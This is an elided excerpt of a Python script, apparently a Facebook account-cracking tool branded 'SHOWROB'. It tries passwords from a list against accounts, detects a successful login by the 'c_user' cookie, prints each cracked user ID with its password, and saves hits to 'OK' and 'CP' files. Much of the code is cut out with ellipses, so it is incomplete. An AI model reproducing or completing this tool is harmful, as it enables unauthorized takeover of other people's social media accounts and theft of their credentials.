...
def o():
    ...
    jalan('\033[1;95m[\033[1;93m4\033[1;95m]\033[1;96m FOLLOW TEAM')
...
def i():
    ...
    print('IDS SAVED IN SHOWROB-404-OK.txt, SHOWROB-404-CP.txt')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('\033[1;32mSHOWROB-OK ]' +uid+ ' | ' +ps+'\033[0;35m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r%s[SHOWROB] \033[1;32m[%s/%s] \033[1;32m[OK-%s] \r'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
